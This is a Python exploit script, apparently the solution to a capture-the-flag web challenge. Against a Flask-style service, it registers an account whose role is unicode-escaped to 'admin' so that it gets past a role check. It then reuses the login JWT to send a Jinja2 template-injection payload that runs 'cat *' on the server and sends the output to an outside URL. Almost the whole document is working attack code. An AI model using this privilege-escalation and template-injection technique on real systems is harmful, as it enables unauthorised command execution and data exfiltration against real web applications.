import requests
import json, sys, re

#Enter username and password want to register
username = "kou"
password = "123"

#Enter target url
url = "http://0.0.0.0:8082/"
data = f'{{"username": "{username}", "password": "{password}", "role": "\\u0061\\u0064\\u006d\\u0069\\u006e"}}'

headers = {
    "Content-Type": "application/json"
}
#register

response = requests.post(url + "register", data=data, headers=headers)

print("Register with username: " + username + ", password: " + password)
print("Status code:", response.status_code)
print("Response text:", response.text)

if response.status_code!=201:
    sys.exit()
    
#login

data = f'{{"username": "{username}","password": "{password}"}}'

response = requests.post(url + "login", data=data, headers=headers)

print("Login with username: " + username + ", password: " + password)
print("Status code:", response.status_code)
print("Response text:", response.text)

if response.status_code!=200:
    sys.exit()
    
cookie=json.loads(response.text)

cookie = cookie["message"]

# Get flag with ssti payload
headers = {
    "Content-Type": "application/json",
    "Cookie": f"jwt_token={cookie}"
}

data = """
{
    "template": "{{ url_for.__globals__['__builtins__']['__import__']('urllib2').urlopen('https://123/?flag=' + url_for.__globals__['os'].popen('cat *').read()) }}"
}
"""

response = requests.post(url + "render", data=data, headers=headers)
print("Get flag: ")
print("Status code:", response.status_code)
matches = re.findall(r"ISITDTU\{.*?\}", response.text)

print("\nFlag is: ")
# Print flag
for match in matches:
    print(match)
